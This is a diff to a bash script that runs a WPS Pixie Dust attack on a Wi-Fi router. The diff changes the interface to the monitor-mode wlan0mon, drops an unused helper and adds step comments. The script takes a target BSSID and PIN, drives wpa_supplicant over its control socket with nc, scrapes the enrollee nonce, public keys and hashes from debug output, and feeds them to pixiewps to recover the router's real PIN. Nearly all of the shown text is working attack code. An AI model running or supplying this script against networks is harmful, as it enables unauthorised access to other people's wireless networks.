@@ -2,15 +2,10 @@
 
 TEMPDIR=$(mktemp -d)
 TEMPFILE=$(mktemp --suffix=.conf)
-IFACE="wlan0"
+IFACE="wlan0mon"
 
 BSSID=$1
 PIN=$2
-
-function setvar()
-{
-	"$1"=$2
-}
 
 function cleanup() 
 {
@@ -24,10 +19,14 @@ function gethex()
 	echo $1 | cut -d : -f 3 | sed --expression='s/ //g'
 }
 
+#Start here
+#Write wpa_supplicant config to file
 echo -e "ctrl_interface=${TEMPDIR}\nctrl_interface_group=root\nupdate_config=1\n" > $TEMPFILE
 
+#Send WPS_REG command to wpa_supplicant socket
 sleep 2 && echo "WPS_REG $BSSID $PIN" | nc -u -U $TEMPDIR/$IFACE &
 
+#Launch wpa_supplicant & parse output
 while read -r LINE
 do
 	if [ "$(echo "$LINE" | grep 'Enrollee Nonce')" ] && [ ! "$ENONCE" ]
@@ -77,7 +76,8 @@ do
 
 done <<<$(wpa_supplicant -K -d -D nl80211 -i $IFACE -c $TEMPFILE | tee /tmp/log | awk '$1 == "WPS:" {print $0}')
 
+#Launch pixiewps to get real pin
 pixiewps -e "$PKE" -r "$PKR" -s "$EHASH1" -z "$EHASH2" -a "$AUTHKEY" -n "$ENONCE" --force
 
+#Remove temp files and exit
 cleanup
-wait
